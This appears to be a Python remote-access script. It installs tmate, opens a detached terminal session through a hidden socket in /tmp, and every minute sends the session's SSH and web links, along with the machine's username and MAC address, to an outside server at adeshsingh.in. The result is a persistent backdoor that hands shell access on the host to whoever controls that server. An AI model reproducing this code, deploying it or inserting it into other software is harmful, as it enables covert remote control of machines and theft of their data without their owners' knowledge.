#!/usr/bin/python3
import re
import os
import time
import json
import socket
import subprocess
import requests

API_HOST = "adeshsingh.in"
API_PORT = 8080

session = requests.Session()


def log(message: str) -> None:
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}", flush=True)


def is_server_reachable() -> bool:
    try:
        log(f"Checking connectivity ...")
        with socket.create_connection((API_HOST, API_PORT), timeout=10):
            return True
    except OSError as e:
        log(f"Connectivity check failed: {e}")
        return False


def get_username() -> str:
    try:
        users = os.listdir("/home/")
        return users[0] if users else "unknown"
    except Exception as e:
        log(f"Error getting username: {e}")
        return "unknown"


def get_mac_address() -> str:
    try:
        result = subprocess.check_output(
            ["ip", "link", "show"],
            universal_newlines=True,
            timeout=30,
        )
        match = re.search(r"link/ether (\S+)", result)
        return match.group(1).upper() if match else "MAC address not found"
    except Exception as e:
        log(f"Error getting MAC address: {e}")
        return "MAC address not found"


def ensure_tmate_installed() -> None:
    if os.path.exists("/usr/bin/tmate"):
        return

    log("tmate not found at /usr/bin/tmate, attempting installation...")
    try:
        os.system("apt-get update -y")
        os.system("apt-get install -y tmate")
        log("tmate installation attempted.")
    except Exception as e:
        log(f"Error installing tmate: {e}")


def generate_new_session(session_file: str):
    try:
        if not os.path.exists(session_file):
            log("Creating new tmate session...")
            subprocess.run(
                f"tmate -S {session_file} new-session -d -c ~/",
                shell=True,
                check=True,
                timeout=30,
            )
            subprocess.run(
                f"tmate -S {session_file} wait tmate-ready",
                shell=True,
                check=True,
                timeout=60,
            )

        process = subprocess.Popen(
            f"tmate -S {session_file} display -p '#{{tmate_ssh}}'",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            session_output, err_output = process.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            process.kill()
            log("Timed out while fetching tmate session info.")
            return None, None

        if process.returncode != 0:
            log(f"tmate display command failed: {err_output.decode(errors='ignore')}")
            return None, None

        ssh_session = session_output.decode().strip()
        if not ssh_session:
            log("Empty SSH session string returned by tmate.")
            return None, None

        web_session = ssh_session.split("@")[0].replace("ssh ", "https://tmate.io/t/")
        return ssh_session, web_session

    except subprocess.TimeoutExpired:
        log("Timed out while creating tmate session.")
        return None, None
    except Exception as e:
        log(f"Error generating tmate session: {e}")
        return None, None


def send_payload_to_api(payload: dict) -> bool:
    try:
        log(f"Sending payload to API ...")
        response = session.post(
            f"https://{API_HOST}:{API_PORT}/api/session/",
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload),
            timeout=10,
        )
        log(f"API response status: {response.status_code}")
        response.raise_for_status()
        return True
    except requests.exceptions.Timeout:
        log("Request to API timed out.")
        return False
    except requests.exceptions.RequestException as e:
        log(f"Error sending payload to API: {e}")
        return False


def main():
    session_file = "/tmp/.private-session.sock"

    ensure_tmate_installed()

    while True:
        try:
            if not is_server_reachable():
                log("API server not reachable. Will retry after interval.")
                time.sleep(60)
                continue

            ssh_session, web_session = generate_new_session(session_file)
            if not ssh_session or not web_session:
                log("Failed to obtain tmate session. Will retry after interval.")
                time.sleep(60)
                continue

            payload = {
                "username": get_username(),
                "mac_address": get_mac_address(),
                "ssh_session": ssh_session,
                "web_session": web_session,
                "status": True,
            }
            log(f"Prepared payload: {payload}")

            if send_payload_to_api(payload):
                log("Payload sent successfully.")
            else:
                log("Failed to send payload to API.")

        except Exception as e:
            log(f"Unexpected error in main loop: {e}")

        time.sleep(60)


if __name__ == "__main__":
    main()
